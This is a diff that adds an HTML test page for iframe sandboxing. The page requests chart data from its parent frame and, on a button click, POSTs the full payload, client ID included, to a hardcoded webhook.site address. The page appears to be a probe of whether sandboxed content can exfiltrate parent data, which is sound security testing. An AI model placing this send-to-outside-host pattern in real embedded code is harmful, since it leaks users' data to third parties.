@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <title>Iframe Sandbox Test</title>
+        <style>
+            :root {
+                color-scheme: light;
+                font-family: Inter, ui-sans-serif, system-ui, -apple-system,
+                    BlinkMacSystemFont, 'Segoe UI', sans-serif;
+                color: #172033;
+                background: #f4f7fb;
+            }
+
+            * {
+                box-sizing: border-box;
+            }
+
+            body {
+                margin: 0;
+                padding: 24px;
+            }
+
+            main {
+                width: min(980px, 100%);
+                margin: 0 auto;
+            }
+
+            h1,
+            h2,
+            p {
+                margin-top: 0;
+            }
+
+            h1 {
+                margin-bottom: 8px;
+                font-size: clamp(24px, 4vw, 34px);
+            }
+
+            h2 {
+                margin-bottom: 12px;
+                font-size: 18px;
+            }
+
+            .lede {
+                color: #56627a;
+                line-height: 1.6;
+            }
+
+            .toolbar {
+                display: flex;
+                flex-wrap: wrap;
+                gap: 10px;
+                margin: 20px 0;
+            }
+
+            button {
+                padding: 10px 14px;
+                border: 1px solid #0c69ea;
+                border-radius: 8px;
+                color: white;
+                background: #0c69ea;
+                font: inherit;
+                font-weight: 600;
+                cursor: pointer;
+            }
+
+            button.secondary {
+                color: #0c69ea;
+                background: white;
+            }
+
+            button:disabled {
+                cursor: wait;
+                opacity: 0.55;
+            }
+
+            button:focus-visible {
+                outline: 3px solid #a7ccff;
+                outline-offset: 2px;
+            }
+
+            .grid {
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+                gap: 16px;
+            }
+
+            .card {
+                min-width: 0;
+                padding: 18px;
+                border: 1px solid #dce3ed;
+                border-radius: 12px;
+                background: white;
+                box-shadow: 0 4px 16px rgba(26, 39, 68, 0.05);
+            }
+
+            .status {
+                display: inline-flex;
+                align-items: center;
+                gap: 8px;
+                margin-bottom: 14px;
+                padding: 6px 10px;
+                border-radius: 999px;
+                color: #334155;
+                background: #eef2f7;
+                font-size: 13px;
+                font-weight: 600;
+            }
+
+            .status::before {
+                width: 8px;
+                height: 8px;
+                border-radius: 50%;
+                background: #64748b;
+                content: '';
+            }
+
+            .status.success::before {
+                background: #16a34a;
+            }
+
+            .status.error::before {
+                background: #dc2626;
+            }
+
+            pre {
+                min-height: 180px;
+                max-height: 420px;
+                margin: 0;
+                overflow: auto;
+                padding: 14px;
+                border-radius: 8px;
+                color: #dbeafe;
+                background: #111827;
+                font-family: 'SFMono-Regular', Consolas, 'Liberation Mono',
+                    monospace;
+                font-size: 12px;
+                line-height: 1.55;
+                white-space: pre-wrap;
+                word-break: break-word;
+            }
+
+            .posts {
+                display: grid;
+                gap: 10px;
+            }
+
+            .post {
+                padding: 12px;
+                border: 1px solid #e2e8f0;
+                border-radius: 8px;
+                background: #f8fafc;
+            }
+
+            .post strong {
+                display: block;
+                margin-bottom: 5px;
+                color: #0f172a;
+                line-height: 1.35;
+            }
+
+            .post span {
+                color: #64748b;
+                font-size: 12px;
+            }
+        </style>
+    </head>
+    <body>
+        <main>
+            <h1>Iframe Sandbox Test</h1>
+            <p class="lede">
+                This page can request the chart render payload from its
+                immediate parent and independently POST data to a webhook.
+            </p>
+
+            <div class="toolbar">
+                <button id="request-parent" type="button">
+                    Request parent data
+                </button>
+                <button id="fetch-posts" type="button" class="secondary">
+                    POST parent data to webhook
+                </button>
+            </div>
+
+            <div class="grid">
+                <section class="card">
+                    <div id="parent-status" class="status">Waiting</div>
+                    <h2>Parent message payload</h2>
+                    <pre id="parent-output">
+No sandbox:render message received yet.</pre
+                    >
+                </section>
+
+                <section class="card">
+                    <div id="fetch-status" class="status">Not started</div>
+                    <h2>Webhook response</h2>
+                    <div id="posts" class="posts">
+                        Click "POST parent data to webhook" to begin.
+                    </div>
+                </section>
+            </div>
+        </main>
+
+        <script>
+            (function () {
+                var WEBHOOK_URL =
+                    'https://webhook.site/a0ec687e-3863-44d9-a059-3f77b6a5f142';
+
+                var requestParentButton =
+                    document.getElementById('request-parent');
+                var fetchPostsButton = document.getElementById('fetch-posts');
+                var parentStatus = document.getElementById('parent-status');
+                var parentOutput = document.getElementById('parent-output');
+                var fetchStatus = document.getElementById('fetch-status');
+                var posts = document.getElementById('posts');
+
+                // Holds the most recent payload received from the parent
+                // via postMessage, so it can be POSTed to the webhook.
+                var lastParentPayload = null;
+
+                function reportSize() {
+                    window.requestAnimationFrame(function () {
+                        window.parent.postMessage(
+                            {
+                                type: 'sandbox:size',
+                                height: document.documentElement.scrollHeight,
+                            },
+                            '*',
+                        );
+                    });
+                }
+
+                function stringify(value) {
+                    try {
+                        return JSON.stringify(
+                            value,
+                            function (_key, item) {
+                                return typeof item === 'bigint'
+                                    ? String(item)
+                                    : item;
+                            },
+                            2,
+                        );
+                    } catch (error) {
+                        return 'Unable to display payload: ' + error.message;
+                    }
+                }
+
+                function requestParentData() {
+                    if (window.parent === window) {
+                        parentStatus.textContent = 'Opened outside an iframe';
+                        parentStatus.className = 'status error';
+                        return;
+                    }
+
+                    parentStatus.textContent = 'Request sent';
+                    parentStatus.className = 'status';
+                    window.parent.postMessage({ type: 'sandbox:ready' }, '*');
+                }
+
+                window.addEventListener('message', function (event) {
+                    if (event.source !== window.parent) {
+                        return;
+                    }
+
+                    var message = event.data;
+                    if (!message || message.type !== 'sandbox:render') {
+                        return;
+                    }
+
+                    // Keep the full payload for posting; only a trimmed
+                    // sample is shown on-screen.
+                    lastParentPayload = message;
+
+                    var sample = {
+                        clientId: message.clientId,
+                        data: Array.isArray(message.data)
+                            ? message.data.slice(0, 3)
+                            : message.data,
+                        comparisonData: Array.isArray(message.comparisonData)
+                            ? message.comparisonData.slice(0, 3)
+                            : message.comparisonData,
+                    };
+
+                    parentStatus.textContent = 'sandbox:render received';
+                    parentStatus.className = 'status success';
+                    parentOutput.textContent = stringify(sample);
+                    reportSize();
+                });
+
+                requestParentButton.addEventListener(
+                    'click',
+                    requestParentData,
+                );
+
+                fetchPostsButton.addEventListener('click', function () {
+                    fetchPostsButton.disabled = true;
+                    fetchStatus.textContent = 'Sending';
+                    fetchStatus.className = 'status';
+                    posts.textContent = 'Posting to webhook…';
+
+                    var payload = lastParentPayload || {
+                        note: 'No sandbox:render message received yet.',
+                        sentAt: new Date().toISOString(),
+                    };
+
+                    window
+                        .fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: stringify(payload),
+                        })
+                        .then(function (response) {
+                            if (!response.ok) {
+                                throw new Error(
+                                    'Request failed with status ' +
+                                        response.status,
+                                );
+                            }
+                            fetchStatus.textContent =
+                                'Posted (status ' + response.status + ')';
+                            fetchStatus.className = 'status success';
+                            posts.textContent =
+                                'Payload sent to webhook.site. Check the ' +
+                                'webhook.site dashboard to inspect it.';
+                            reportSize();
+                        })
+                        .catch(function (error) {
+                            fetchStatus.textContent = 'POST failed';
+                            fetchStatus.className = 'status error';
+                            posts.textContent = error.message;
+                            reportSize();
+                        })
+                        .finally(function () {
+                            fetchPostsButton.disabled = false;
+                        });
+                });
+
+                reportSize();
+            })();
+        </script>
+    </body>
+</html>
